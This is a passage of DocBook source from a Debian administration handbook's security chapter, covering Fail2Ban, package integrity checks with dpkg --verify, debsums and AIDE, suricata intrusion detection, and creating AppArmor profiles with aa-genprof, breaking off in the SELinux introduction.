      be configured to monitor any service that writes login attempts to
      a log file. It can be found in the package
      <emphasis role="pkg">fail2ban</emphasis>.</para>

      <para>Fail2Ban is configured through a simple protocol by
      <command>fail2ban-client</command>, which also reads
      configuration files and issues corresponding configuration
      commands to the server, <command>fail2ban-server</command>. It has
      four configuration file types, all stored in
      <filename>/etc/fail2ban/</filename>:</para>

      <indexterm><primary><filename>/etc</filename></primary><secondary><filename>/etc/fail2ban/</filename></secondary></indexterm>

      <itemizedlist>
        <listitem>
          <para><filename>fail2ban.conf</filename>. Global configuration (such
          as logging).</para>
        </listitem>
        <listitem>
          <para><filename>filter.d/*.conf</filename>. Filters specifying how to detect
          authentication failures. The Debian package already contains filters for
          many common programs.</para>
        </listitem>
        <listitem>
          <para><filename>action.d/*.conf</filename>. Actions defining the commands for
          banning and “unbanning“ of IP addresses.</para>
        </listitem>
        <listitem>
          <indexterm><primary>jail</primary></indexterm>
          <para><filename>jail.conf</filename>. It is where <emphasis>jails</emphasis>, the
          combinations of filters and actions, are defined.</para>
        </listitem>
      </itemizedlist>

      <para>Let us have a look at the configuration of <command>sshd</command> in
      <filename>/etc/fail2ban/jail.conf</filename> to better understand how
      Fail2Ban works...</para>

      <indexterm><primary>SSH</primary><secondary>fail2ban</secondary></indexterm>

<programlisting>[...]
[DEFAULT]
[...]
bantime   = 10m
[...]
findtime  = 10m
[...]
maxretry  = 5
[...]
[sshd]
port     = ssh
logpath  = %(sshd_log)s
backend  = %(sshd_backend)s
</programlisting>

      <para>Fail2Ban will check for failed login attempts for
      <command>sshd</command> using Python regular expressions
      defined in
      <filename>/etc/fail2ban/filter.d/sshd.conf</filename>
      against the log file of <command>sshd</command>, which is
      defined in the variable <literal>sshd_log</literal> in the
      file <filename>/etc/fail2ban/paths-common.conf</filename>.
      If Fail2Ban detects five failed login attempts within 10 minutes,
      it will ban the IP address where those attempts originated for 10
      minutes.</para>

      <para>To enable, disable, or configure “jails“, the main configuration
      file <filename>/etc/fail2ban/jail.conf</filename> is not supposed to be
      altered. Instead this is supposed to be done in
      <filename>/etc/fail2ban/jail.d/defaults-debian.conf</filename> or files
      within the same directory.</para>

      <para>Fail2Ban is a very simple and effective way to protect
      against the most common brute-force attacks, but it
      cannot protect against distributed brute-force attacks, which
      is when an attacker uses a large number of machines spread
      around the Internet.</para>

      <para>A good way to provide extra protection against distributed
      brute force attacks is to artificially increase the login time
      after each failed attempt.</para>
    </section>

    <section>
      <title>Detecting Changes</title>

      <para>Once the system is installed and configured, and barring
      security upgrades, there is usually no reason for most of the files
      and directories to evolve, data excepted. It is therefore interesting
      to make sure that files actually do not change: any unexpected change
      would therefore be worth investigating. This section presents a few
      tools able to monitor files and to warn the administrator when an
      unexpected change occurs (or simply to list such changes).</para>

      <section id="sect.dpkg-verify">
        <title>Auditing Packages with <command>dpkg --verify</command></title>
        <indexterm><primary><command>dpkg</command></primary><secondary><literal>--verify</literal></secondary></indexterm>

        <sidebar>
          <title><emphasis>GOING FURTHER</emphasis> Protecting against upstream changes</title>

          <para><command>dpkg --verify</command> and
          <command>debsums</command> are useful in detecting changes
          to files coming from a Debian package, but they will be useless if
          the package itself is compromised, for instance, if the Debian
          mirror is compromised. Protecting against this class of attacks
          involves using APT's digital signature verification system (see
          <xref linkend="sect.package-authentication"/>), and taking care
          to only install packages from a certified origin.</para>
        </sidebar>

        <para><command>dpkg --verify</command> (or <command>dpkg -V</command>)
        is an interesting tool since it allows finding what installed files
        have been modified (potentially by an attacker), but this should be
        taken with a grain of salt. To do its job it relies on checksums
        stored in dpkg's own database which is stored on the hard disk (they
        can be found in
        <filename>/var/lib/dpkg/info/<replaceable>package</replaceable>.md5sums</filename>);
        a thorough attacker will therefore update these files so they contain
        the new checksums for the subverted files.</para>

        <indexterm><primary><filename>.md5sums</filename></primary></indexterm>

        <sidebar>
          <title><emphasis>BACK TO BASICS</emphasis> File fingerprint</title>
          <indexterm><primary>file</primary><secondary>fingerprint</secondary></indexterm>
          <indexterm><primary>fingerprint</primary></indexterm>
          <indexterm><primary>hashsum</primary></indexterm>
          <indexterm><primary>control sum</primary><seealso>hashsum</seealso></indexterm>
          <indexterm><primary>MD5</primary></indexterm>
          <indexterm><primary>SHA1</primary></indexterm>

          <para>As a reminder: a fingerprint is a value, often a number (even
          though in hexadecimal notation), that contains a kind of signature
          for the contents of a file. This signature is calculated with an
          algorithm, e.g. MD5 via <command>md5sum</command> or SHA* via
          various <command>sha*</command> commands being well-known
          examples, that more or less guarantee that even the tiniest change
          in the file contents implies a change in the fingerprint; this is
          known as the “avalanche effect”. This allows a simple numerical
          fingerprint to serve as a litmus test to check whether the contents
          of a file have been altered. These algorithms are not reversible;
          in other words, for most of them, knowing a fingerprint doesn't
          allow finding the corresponding contents. Recent mathematical
          advances seem to weaken the absoluteness of these principles, but
          their use is not called into question so far, since creating
          different contents yielding the same fingerprint still seems to be
          quite a difficult task.</para>
        </sidebar>

        <para>Running <command>dpkg -V</command> will verify all installed
        packages and will print out a line for each file with a failing test.
        The output format is the same as the one of <command>rpm -V</command>
        where each character denotes a test on some specific meta-data.
        Unfortunately <command>dpkg</command> does not store the meta-data
        needed for most tests and will thus output question marks for them.
        Currently only the checksum test can yield a "5" on the third character
        (when it fails).</para>

        <screen>
<computeroutput># </computeroutput><userinput>dpkg -V</userinput>
<computeroutput>??5??????   /lib/systemd/system/ssh.service
??5?????? c /etc/libvirt/qemu/networks/default.xml
??5?????? c /etc/lvm/lvm.conf
??5?????? c /etc/salt/roster</computeroutput>
</screen>

        <para>In the sample above, dpkg reports a change to SSH's service file
        that the administrator made to the packaged file instead of using an
        appropriate
        <filename>/etc/systemd/system/ssh.service.d/override.conf</filename>
        override (which would be stored below <filename>/etc</filename> like
        any configuration change should be). It also lists multiple
        configuration files (identified by the "c" letter on the second field)
        that had been legitimately modified.</para>

        <indexterm><primary><filename>/etc</filename></primary><secondary><filename>/etc/systemd/system/*.d/override.conf</filename></secondary></indexterm>
      </section>

      <section id="sect.debsums">
        <title>Auditing Packages: <command>debsums</command> and its Limits</title>
        <indexterm><primary><command>debsums</command></primary></indexterm>

        <para>
          <command>debsums</command> is the ancestor of <command>dpkg -V</command>
          and is thus mostly obsolete. It suffers from the same limitations than
          dpkg. Fortunately, some of the limitations can be worked-around (whereas dpkg
          does not offer similar work-arounds).
        </para>

        <para>Since the data on the disk cannot be trusted,
        <command>debsums</command> offers to do its checks based on
        <filename>.deb</filename> files instead of relying on dpkg's database.
        To download trusted <filename>.deb</filename> files of all the packages
        installed, we can rely on APT's authenticated downloads. This
        operation can be slow and tedious, and should therefore not be
        considered a proactive technique to be used on a regular basis.</para>

        <screen>
<computeroutput># </computeroutput><userinput>apt-get --reinstall -d install `grep-status -e 'Status: install ok installed' -n -s Package`
</userinput><computeroutput>[ ... ]
# </computeroutput><userinput>debsums -p /var/cache/apt/archives --generate=all</userinput>
</screen>

        <para>Note that this example uses the
        <command>grep-status</command> command from the <emphasis
        role="pkg">dctrl-tools</emphasis> package, which is not installed by
        default.</para>

        <indexterm><primary><filename>/etc</filename></primary><secondary><filename>/etc/default/debsums</filename></secondary></indexterm>
        <indexterm><primary><filename>/etc</filename></primary><secondary><filename>/etc/debsums-ignore</filename></secondary></indexterm>

        <para><command>debsums</command> can be run frequently as a cronjob
        setting <literal>CRON_CHECK</literal> in
        <filename>/etc/default/debsums</filename>. To ignore certain files
        outside the <filename>/etc</filename> directory, which have been
        altered on purpuse or which are expected to change (like
        <filename>/usr/share/misc/pci.ids</filename>) you can add them to
        <filename>/etc/debsums-ignore</filename>.</para>
      </section>
      <section>
        <title>Monitoring Files: AIDE</title>
        <indexterm><primary><command>aideinit</command></primary></indexterm>
        <indexterm><primary>AIDE</primary></indexterm>
        <indexterm><primary>Advanced Intrusion Detection Environment</primary><see>AIDE</see></indexterm>
        <indexterm><primary><filename>/etc</filename></primary><secondary><filename>/etc/cron.daily/aide</filename></secondary></indexterm>

        <para>The AIDE tool (<emphasis>Advanced Intrusion Detection
        Environment</emphasis>) allows checking file integrity, and
        detecting any change against a previously recorded image of the
        valid system. This image is stored as a database
        (<filename>/var/lib/aide/aide.db</filename>) containing the
        relevant information on all files of the system (fingerprints,
        permissions, timestamps and so on). This database is first
        initialized with <command>aideinit</command>; it is then used daily
        (by the <filename>/etc/cron.daily/aide</filename> script) to check
        that nothing relevant changed. When changes are detected, AIDE
        records them in log files
        (<filename>/var/log/aide/*.log</filename>) and sends its findings
        to the administrator by email.</para>

        <sidebar>
          <title><emphasis>IN PRACTICE</emphasis> Protecting the database</title>

          <para>Since AIDE uses a local database to compare the states of
          the files, the validity of its results is directly linked to the
          validity of the database. If an attacker gets root permissions on
          a compromised system, they will be able to replace the database
          and cover their tracks. A possible workaround would be to store
          the reference data on read-only storage media.</para>
        </sidebar>

        <indexterm><primary><filename>/etc</filename></primary><secondary><filename>/etc/aide/aide.conf</filename></secondary></indexterm>

        <para>Many options in <filename>/etc/default/aide</filename> can be
        used to tweak the behavior of the <emphasis
        role="pkg">aide</emphasis> package. The AIDE configuration proper
        is stored in <filename>/etc/aide/aide.conf</filename> and
        <filename>/etc/aide/aide.conf.d/</filename> (actually, these files
        are only used by <command>update-aide.conf</command> to generate
        <filename>/var/lib/aide/aide.conf.autogenerated</filename>).
        Configuration indicates which properties of which files need to be
        checked. For instance, the contents of log files changes routinely,
        and such changes can be ignored as long as the permissions of these
        files stay the same, but both contents and permissions of
        executable programs must be constant. Although not very complex,
        the configuration syntax is not fully intuitive, and reading the
        <citerefentry><refentrytitle>aide.conf</refentrytitle>
        <manvolnum>5</manvolnum></citerefentry> manual page is therefore
        recommended.</para>

        <para>A new version of the database is generated daily in
        <filename>/var/lib/aide/aide.db.new</filename>; if all recorded
        changes were legitimate, it can be used to replace the reference
        database.</para>

        <sidebar>
          <title><emphasis>ALTERNATIVE</emphasis> Tripwire and Samhain</title>
          <indexterm><primary><emphasis role="pkg">tripwire</emphasis></primary></indexterm>
          <indexterm><primary><emphasis role="pkg">samhain</emphasis></primary></indexterm>

          <para>Tripwire is very similar to AIDE; even the configuration
          file syntax is almost the same. The main addition provided by
          <emphasis role="pkg">tripwire</emphasis> is a mechanism to sign
          the configuration file, so that an attacker cannot make it point
          at a different version of the reference database.</para>

          <para>Samhain also offers similar features, as well as some
          functions to help detecting rootkits (see the sidebar
          <xref linkend="sidebar.the-checksecurity-and-chkrootkit-rkhunter-packages"/>).
          It can also be deployed globally on a network, and
          record its traces on a central server (with a signature).</para>
        </sidebar>

        <sidebar id="sidebar.the-checksecurity-and-chkrootkit-rkhunter-packages">
          <title><emphasis>QUICK LOOK</emphasis> The <emphasis role="pkg">checksecurity</emphasis> and <emphasis role="pkg">chkrootkit</emphasis>/<emphasis role="pkg">rkhunter</emphasis> packages</title>
          <indexterm><primary><emphasis role="pkg">checksecurity</emphasis></primary></indexterm>
          <indexterm><primary><emphasis role="pkg">chkrootkit</emphasis></primary></indexterm>
          <indexterm><primary><emphasis role="pkg">rkhunter</emphasis></primary></indexterm>

          <para>The first of these packages contains several small scripts
          performing basic checks on the system (empty passwords, new
          setuid files, and so on) and warning the administrator if
          required. Despite its explicit name, an administrator should not
          rely solely on it to make sure a Linux system is secure.</para>

          <para>The <emphasis role="pkg">chkrootkit</emphasis> and
          <emphasis role="pkg">rkhunter</emphasis> packages allow looking
          for <emphasis>rootkits</emphasis> potentially installed on the
          system. As a reminder, these are pieces of software designed to
          hide the compromise of a system while discreetly keeping control
          of the machine. The tests are not 100% reliable, but they can
          usually draw the administrator's attention to potential
          problems.</para>

          <para><emphasis role="pkg">rkhunter</emphasis> also performs
          checks to see if commands have been modified, if the system
          startup files have been modified, and various checks on the network
          interfaces, including checks for listening applications.</para>
        </sidebar>
      </section>
    </section>
    <section id="sect.intrusion-detection">
      <title>Detecting Intrusion (IDS/NIDS)</title>
      <indexterm><primary>detection, intrusion</primary></indexterm>
      <indexterm><primary>intrusion detection</primary></indexterm>
      <indexterm><primary>IDS</primary></indexterm>
      <indexterm><primary>Intrusion Detection System</primary><see>IDS</see></indexterm>
      <indexterm><primary>NIDS</primary></indexterm>
      <indexterm><primary>network</primary><secondary>IDS</secondary><seealso>NIDS</seealso></indexterm>

      <sidebar>
        <title><emphasis>BACK TO BASICS</emphasis> Denial of service</title>
        <indexterm><primary>Denial of Service</primary><see>DoS</see></indexterm>
        <indexterm><primary>Distributed Denial of Service</primary><see>DDoS</see></indexterm>
        <indexterm><primary>DoS</primary></indexterm>
        <indexterm><primary>DDoS</primary></indexterm>

        <para>A “denial of service” attack has only one goal: to make a
        service unavailable. Whether such an attack involves overloading
        the server with queries or exploiting a bug, the end result is the
        same: the service is no longer operational. Regular users are
        unhappy, and the entity hosting the targeted network service
        suffers a loss in reputation (and possibly in revenue, for instance
        if the service was an e-commerce site).</para>

        <para>Such an attack is sometimes “distributed”; this usually
        involves overloading the server with large numbers of queries
        coming from many different sources so that the server becomes
        unable to answer the legitimate queries. These types of attacks
        have gained well-known acronyms: <acronym>DDoS</acronym> and
        <acronym>DoS</acronym> (depending on whether the denial of service
        attack is distributed or not).</para>
      </sidebar>

      <para><command>suricata</command> (in the Debian package of the same
      name) is an NIDS — a <emphasis>Network Intrusion Detection
      System</emphasis>. Its function is to listen to the network and try
      to detect infiltration attempts and/or hostile acts (including denial
      of service attacks). All these events are logged in multiple files
      in <filename>/var/log/suricata</filename>. There are third party tools
      (Kibana/logstash) to better browse all the data collected.
      <ulink type="block" url="https://suricata.io"/>
      <ulink type="block" url="https://www.elastic.co/products/kibana"/>
      </para>
      <indexterm><primary><command>snort</command></primary></indexterm>
      <indexterm><primary><command>suricata</command></primary></indexterm>

      <sidebar>
        <title><emphasis>CAUTION</emphasis> Range of action</title>

        <para>The effectiveness of <command>suricata</command> is limited by
        the traffic seen on the monitored network interface. It will
        obviously not be able to detect anything if it cannot observe the
        real traffic. When plugged into a network switch, it will therefore
        only monitor attacks targeting the machine it runs on, which is
        probably not the intention. The machine hosting
        <command>suricata</command> should therefore be plugged into the
        “mirror” port of the switch, which is usually dedicated to
        chaining switches and therefore gets all the traffic.</para>
      </sidebar>

      <para>Configuring suricata involves reviewing and editing
      <filename>/etc/suricata/suricata.yaml</filename>, which is very
      long because each parameter is abundantly commented.  A minimal
      configuration requires describing the range of addresses that the local
      network covers (<literal>HOME_NET</literal> parameter). In practice, this
      means the set of all potential attack targets. But getting the most of it
      requires reading it in full and adapting it to the local
      situation.</para>

      <indexterm><primary><filename>/etc</filename></primary><secondary><filename>/etc/suricata/suricata.yaml</filename></secondary></indexterm>

      <para>On top of this, you should also edit it to define the network
      <literal>interface</literal>. You might also want to set
      <literal>LISTENMODE=pcap</literal> because the default
      <literal>LISTENMODE=nfqueue</literal> requires further configuration to
      work properly (the netfilter firewall must be configured to pass packets
      to some user-space queue handled by suricata via the
      <literal>NFQUEUE</literal> target).</para>

      <para>To detect bad behavior, <command>suricata</command> needs a set of
      monitoring rules: you can find such rules in the <emphasis
      role="pkg">snort-rules-default</emphasis> package.
      <command>snort</command> is the historical reference in the IDS ecosystem
      and <command>suricata</command> is able to reuse rules written for
      it.</para>

      <indexterm><primary><command>oinkmaster</command></primary></indexterm>

      <para>Alternatively, <command>oinkmaster</command> (in the package of
      the same name) can be used to download Snort rulesets from external
      sources.</para>

      <sidebar>
        <title><emphasis>GOING FURTHER</emphasis> Integration with <command>prelude</command></title>
        <indexterm><primary><command>prelude</command></primary></indexterm>

        <para>Prelude brings centralized monitoring of security
        information. Its modular architecture includes a server (the
        <emphasis>manager</emphasis> in <emphasis
        role="pkg">prelude-manager</emphasis>) which gathers alerts
        generated by <emphasis>sensors</emphasis> of various types.</para>

        <para>Suricata can be configured as such a sensor. Other possibilities
        include <emphasis>prelude-lml</emphasis> (<emphasis>Log Monitor
        Lackey</emphasis>) which monitors log files (in a manner similar to
        <command>logcheck</command>, described in <xref
        linkend="sect.logcheck"/>).</para>
      </sidebar>
    </section>
  </section>
  <section id="sect.apparmor">
    <title>Introduction to AppArmor</title>
    <indexterm><primary>AppArmor</primary></indexterm>

    <section id="sect.apparmor-principles">
      <title>Principles</title>
      <indexterm><primary>MAC</primary></indexterm>
      <indexterm><primary>Mandatory Access Control</primary><see>MAC</see></indexterm>
      <indexterm><primary>LSM</primary></indexterm>
      <indexterm><primary>Linux Security Modules</primary><see>LSM</see></indexterm>

      <para>
        AppArmor is a <emphasis>Mandatory Access Control</emphasis> (MAC)
        system built on Linux's LSM (<emphasis>Linux Security
        Modules</emphasis>) interface. In practice, the kernel queries
        AppArmor before each system call to know whether the process is
        authorized to do the given operation. Through this mechanism, AppArmor
        confines programs to a limited set of resources.
      </para>

      <para>
        AppArmor applies a set of rules (known as “profile”) on each
        program. The profile applied by the kernel depends on the
        installation path of the program being executed.
        Contrary to SELinux (discussed in <xref linkend="sect.selinux" />),
        the rules applied do not depend on the user. All users
        face the same set of rules when they are executing the same
        program (but traditional user permissions still apply and
        might result in different behavior!).
      </para>

      <para>
        AppArmor profiles are stored in <filename>/etc/apparmor.d/</filename>
        and they contain a list of access control rules on resources that
        each program can make use of.
        The profiles are compiled and loaded into the kernel by the
        <command>apparmor_parser</command> command. Each profile can
        be loaded either in enforcing or complaining mode. The former
        enforces the policy and reports violation attempts, while the
        latter does not enforce the policy but still logs the system
        calls that would have been denied.
      </para>

      <indexterm><primary><filename>/etc</filename></primary><secondary><filename>/etc/apparmor.d/</filename></secondary></indexterm>
    </section>
    <section id="sect.apparmor-setup">
      <title>Enabling AppArmor and managing AppArmor profiles</title>
      <indexterm><primary><command>aa-status</command></primary></indexterm>

      <para>
        AppArmor support is built into the standard kernels provided
        by Debian. Enabling AppArmor is thus just a matter of
        installing some packages by executing
        <command>apt install apparmor apparmor-profiles apparmor-utils</command>
        with root privileges.
      </para>

      <para>
        AppArmor is functional after the installation, and <command>aa-status</command>
        will confirm it quickly:
      </para>

      <screen>
<computeroutput># </computeroutput><userinput>aa-status
</userinput><computeroutput>apparmor module is loaded.
32 profiles are loaded.
15 profiles are in enforce mode.
   /usr/bin/man
[...]
17 profiles are in complain mode.
   /usr/sbin/dnsmasq
[...]
1 processes have profiles defined.
1 processes are in enforce mode.
   /usr/sbin/libvirtd (468) libvirtd
0 processes are in complain mode.
0 processes are unconfined but have a profile defined.</computeroutput>
</screen>

      <sidebar>
        <title><emphasis>NOTE</emphasis> More AppArmor profiles</title>
        <indexterm><primary>AppArmor</primary><secondary>profiles</secondary></indexterm>

        <para>
          The <emphasis role="pkg">apparmor-profiles</emphasis> package
          contains profiles managed by the upstream AppArmor community.
          To get even more profiles you can install
          <emphasis role="pkg">apparmor-profiles-extra</emphasis> which
          contains profiles developed by Ubuntu and Debian.
        </para>
      </sidebar>

      <indexterm><primary><command>aa-complain</command></primary></indexterm>
      <indexterm><primary><command>aa-enforce</command></primary></indexterm>
      <indexterm><primary><command>aa-disable</command></primary></indexterm>

      <para>
        The state of each profile can be switched between
        enforcing and complaining with calls to <command>aa-enforce</command>
        and <command>aa-complain</command> giving as parameter either
        the path of the executable or the path to the policy file.
        Additionally a profile can be entirely disabled with
        <command>aa-disable</command> or put in audit mode (to log
        accepted system calls too) with <command>aa-audit</command>.
      </para>

      <screen>
<computeroutput># </computeroutput><userinput>aa-enforce /usr/bin/pidgin</userinput>
<computeroutput>Setting /usr/bin/pidgin to enforce mode.</computeroutput>
<computeroutput># </computeroutput><userinput>aa-complain /usr/sbin/dnsmasq</userinput>
<computeroutput>Setting /usr/sbin/dnsmasq to complain mode.</computeroutput>
</screen>
    </section>
    <section id="sect.apparmor-new-profile">
      <title>Creating a new profile</title>

      <para>
        Even though creating an AppArmor profile is rather easy, most
        programs do not have one. This section will show you how to
        create a new profile from scratch just by using the target
        program and letting AppArmor monitor the system call it makes
        and the resources it accesses.
      </para>

      <indexterm><primary><command>aa-unconfined</command></primary></indexterm>

      <para>
        The most important programs that need to be confined
        are the network facing programs as those are the most likely
        targets of remote attackers. That is why AppArmor conveniently
        provides an <command>aa-unconfined</command> command to list
        the programs which have no associated profile and which expose
        an open network socket. With the <literal>--paranoid</literal>
        option you get all unconfined processes that have at least one
        active network connection.
      </para>

      <screen>
<computeroutput># </computeroutput><userinput>aa-unconfined
</userinput><computeroutput>451 /usr/bin/containerd not confined
467 /usr/sbin/sshd (sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups) not confined
892 /usr/sbin/exim4 not confined
</computeroutput>
</screen>

      <para>
        In the following example, we will thus try to create a
        profile for <command>/sbin/dhclient</command> (there already is a
        profile shipped by <emphasis role="pkg">apparmor-profiles</emphasis>,
        so you can compare your results to the official one). For this
        we will use <command>aa-genprof dhclient</command>. It
        will invite you to use the application in another window
        and when done to come back to <command>aa-genprof</command>
        to scan for AppArmor events in the system logs and
        convert those logs into access rules. For each logged event,
        it will make one or more rule suggestions that you can
        either approve or further edit in multiple ways:
      </para>

      <screen>
<computeroutput># </computeroutput><userinput>aa-genprof dhclient
</userinput><computeroutput>Writing updated profile for /usr/sbin/dhclient.
Setting /usr/sbin/dhclient to complain mode.

Before you begin, you may wish to check if a
profile already exists for the application you
wish to confine. See the following wiki page for
more information:
https://gitlab.com/apparmor/apparmor/wikis/Profiles

Profiling: /usr/sbin/dhclient

Please start the application to be profiled in
another window and exercise its functionality now.

Once completed, select the "Scan" option below in 
order to scan the system logs for AppArmor events. 

For each AppArmor event, you will be given the 
opportunity to choose whether the access should be 
allowed or denied.

[(S)can system log for AppArmor events] / (F)inish
<userinput>S</userinput>
Reading log entries from /var/log/syslog.

Profile:  /usr/sbin/dhclient <co id="aa-genprof-execute"/>
Execute:  /usr/sbin/dhclient-script
Severity: unknown

(I)nherit / (C)hild / (P)rofile / (N)amed / (U)nconfined / (X) ix On / (D)eny / Abo(r)t / (F)inish
<userinput>P</userinput>

Should AppArmor sanitise the environment when
switching profiles?

Sanitising environment is more secure,
but some applications depend on the presence
of LD_PRELOAD or LD_LIBRARY_PATH.

[(Y)es] / (N)o
<userinput>Y</userinput>
Writing updated profile for /usr/sbin/dhclient-script.
Complain-mode changes:

Profile:    /usr/sbin/dhclient <co id="aa-genprof-capability"/>
Capability: net_raw
Severity:   8

 [1 - capability net_raw,]
(A)llow / [(D)eny] / (I)gnore / Audi(t) / Abo(r)t / (F)inish
<userinput>A</userinput>
Adding capability net_raw, to profile.

Profile:    /usr/sbin/dhclient
Capability: net_bind_service
Severity:   8

 [1 - #include &lt;abstractions/nis&gt;]
  2 - capability net_bind_service,
(A)llow / [(D)eny] / (I)gnore / Audi(t) / Abo(r)t / (F)inish
<userinput>A</userinput>
Adding #include &lt;abstractions/nis&gt; to profile.

Profile:  /usr/sbin/dhclient <co id="aa-genprof-read"/>
Path:     /etc/ssl/openssl.cnf
New Mode: owner r
Severity: 2

 [1 - #include &lt;abstractions/lightdm&gt;]
  2 - #include &lt;abstractions/openssl&gt;
  3 - #include &lt;abstractions/ssl_keys&gt;
  4 - owner /etc/ssl/openssl.cnf r,
(A)llow / [(D)eny] / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Audi(t) / (O)wner permissions off / Abo(r)t / (F)inish
<userinput>2</userinput>

Profile:  /usr/sbin/dhclient
Path:     /etc/ssl/openssl.cnf
New Mode: owner r
Severity: 2

  1 - #include &lt;abstractions/lightdm&gt; 
 [2 - #include &lt;abstractions/openssl&gt;]
  3 - #include &lt;abstractions/ssl_keys&gt;
  4 - owner /etc/ssl/openssl.cnf r, 
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>A</userinput>
[...]
Profile:  /usr/sbin/dhclient-script <co id="aa-genprof-other-profile"/>
Path:     /usr/bin/dash
New Mode: owner r
Severity: unknown

  1 - #include &lt;abstractions/gvfs-open&gt;
 [2 - #include &lt;abstractions/lightdm&gt;]
  3 - #include &lt;abstractions/ubuntu-browsers.d/plugins-common&gt;
  4 - #include &lt;abstractions/xdg-open&gt;
  5 - owner /usr/bin/dash r,
(A)llow / [(D)eny] / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Audi(t) / (O)wner permissions off / Abo(r)t / (F)inish
<userinput>A</userinput>
Adding #include &lt;abstractions/lightdm&gt; to profile.
Deleted 2 previous matching profile entries.

= Changed Local Profiles =

The following local profiles were changed. Would you like to save them?

 [1 - /usr/sbin/dhclient]
  2 - /usr/sbin/dhclient-script
(S)ave Changes / Save Selec(t)ed Profile / [(V)iew Changes] / View Changes b/w (C)lean profiles / Abo(r)t
<userinput>S</userinput>
Writing updated profile for /usr/sbin/dhclient.
Writing updated profile for /usr/sbin/dhclient-script.

Profiling: /usr/sbin/dhclient

Please start the application to be profiled in
another window and exercise its functionality now.

Once completed, select the "Scan" option below in
order to scan the system logs for AppArmor events.

For each AppArmor event, you will be given the
opportunity to choose whether the access should be
allowed or denied.

[(S)can system log for AppArmor events] / (F)inish
<userinput>F</userinput>
Setting /usr/sbin/dhclient to enforce mode.
Setting /usr/sbin/dhclient-script to enforce mode.

Reloaded AppArmor profiles in enforce mode.

Please consider contributing your new profile!
See the following wiki page for more information:
https://gitlab.com/apparmor/apparmor/wikis/Profiles

Finished generating profile for /usr/sbin/dhclient.</computeroutput>
</screen>

      <para>
        Note that the program does not display back the control
        characters that you type but for the clarity of the explanation we
        have included them in the previous transcript.
      </para>

      <calloutlist>
        <callout arearefs="aa-genprof-execute">
          <para>
            The first event detected is the execution of another program.
            In that case, you have multiple choices: you can run the program
            with the profile of the parent process (the “Inherit” choice),
            you can run it with its own dedicated profile (the
            “Profile” and the “Named” choices, differing only by the
            possibility to use an arbitrary profile name), you can run it
            with a sub-profile of the parent process (the “Child” choice),
            you can run it without any profile (the “Unconfined” choice)
            or you can decide to not run it at all (the “Deny” choice).
          </para>
          <para>
            Note that when you opt to run it under a dedicated profile
            that doesn't exist yet, the tool will create the missing profile
            for you and will make rule suggestions for that profile in the
            same run.
          </para>
        </callout>
        <callout arearefs="aa-genprof-capability">
          <para>
            At the kernel level, the special powers of the root user have been split
            in “capabilities”. When a system call requires a specific capability,
            AppArmor will verify whether the profile allows the program to make
            use of this capability.
          </para>
        </callout>
        <callout arearefs="aa-genprof-read">
          <para>
            Here the program seeks read permissions for
            <filename>/etc/ssl/openssl.cnf</filename>. <command>aa-genprof</command>
            detected that this permission was also granted by multiple
            “abstractions” and offers them as alternative choices. An
            abstraction provides a reusable set of access rules grouping
            together multiple resources that are commonly used together.
            In this specific case, the file is generally accessed through
            the nameservice related functions of the C library and we type
            “2” to first select the “#include
            &lt;abstractions/openssl&gt;” choice and then “A” to allow
            it.
          </para>
        </callout>
        <callout arearefs="aa-genprof-other-profile">
          <para>
            Notice that this access request is not part of the dhclient
            profile but of the new profile that we created when we allowed
            <filename>/usr/sbin/dhclient-script</filename> to
            run with its own profile.
          </para>
          <para>
            After having gone through all the logged events, the program
            offers to save all the profiles that were created during the
            run. In this case, we have two profiles that we save at once
            with “Save” (but you can save them individually too) before
            leaving the program with “Finish”.
          </para>
        </callout>
      </calloutlist>

      <indexterm><primary><command>aa-genprof</command></primary></indexterm>
      <indexterm><primary><command>aa-logprof</command></primary></indexterm>

      <para>
        <command>aa-genprof</command> is in fact only a smart wrapper
        around <command>aa-logprof</command>: it creates an empty profile,
        loads it in complain mode and then run
        <command>aa-logprof</command> which is a tool to update a profile
        based on the profile violations that have been logged. So you can
        re-run that tool later to improve the profile that you just
        created.
      </para>

      <para>
        If you want the generated profile to be complete, you should use the
        program in all the ways that it is legitimately used. In the case
        of dhclient, it means running it via Network Manager, running it via
        ifupdown, running it manually, etc. In the end, you might get
        a <filename>/etc/apparmor.d/usr.sbin.dhclient</filename> close to the
        profile shipped by <emphasis role="pkg">apparmor-profiles</emphasis> in
        <filename>/usr/share/apparmor/extra-profiles/sbin.dhclient</filename>.
      </para>

      <indexterm><primary><filename>/etc</filename></primary><secondary><filename>/etc/apparmor.d/</filename></secondary></indexterm>

      <para>
        And <filename>/etc/apparmor.d/usr.sbin.dhclient-script</filename> might
        be similar to
        <filename>/usr/share/apparmor/extra-profiles/sbin.dhclient</filename>,
        shipped in <emphasis role="pkg">apparmor-profiles</emphasis> too.
      </para>
    </section>
  </section>
  <section id="sect.selinux">
    <title>Introduction to SELinux</title>
    <indexterm><primary>SELinux</primary></indexterm>
    <section id="sect.selinux-principles">
      <title>Principles</title>

      <para>SELinux (<emphasis>Security Enhanced Linux</emphasis>) is a
      <emphasis>Mandatory Access Control</emphasis> system built on Linux's
      LSM (<emphasis>Linux Security Modules</emphasis>) interface. In
      practice, the kernel queries SELinux before each system call to know
      whether the process is authorized to do the given operation.</para>

      <para>SELinux uses a set of rules — collectively known as a
      <emphasis>policy</emphasis> — to authorize or forbid operations.
      Those rules are difficult to create. Fortunately, two standard
      policies (<emphasis>targeted</emphasis> and
      <emphasis>strict</emphasis>) are provided to avoid the bulk of the
      configuration work.</para>

      <para>With SELinux, the management of rights is completely different
      from traditional Unix systems. The rights of a process depend on its
      <emphasis>security context</emphasis>. The context is defined by the
      <emphasis>identity</emphasis> of the user who started the process,
      the <emphasis>role</emphasis> and the <emphasis>domain</emphasis>
      that the user carried at that time. The rights really depend on the
      domain, but the transitions between domains are controlled by the
      roles. Finally, the possible transitions between roles depend on the
      identity.</para>

      <figure>
        <title>Security contexts and Unix users</title>
        <mediaobject>
          <imageobject>
            <imagedata fileref="images/selinux-context.png" scalefit="1" width="65%"/>
          </imageobject>
        </mediaobject>
      </figure>

      <para>In practice, during login, the user gets assigned a default
      security context (depending on the roles that they should be able to
      endorse). This defines the current domain, and thus the domain that
      all new child processes will carry. If you want to change the current
      role and its associated domain, you must call <command>newrole -r
      <replaceable>role_r</replaceable> -t
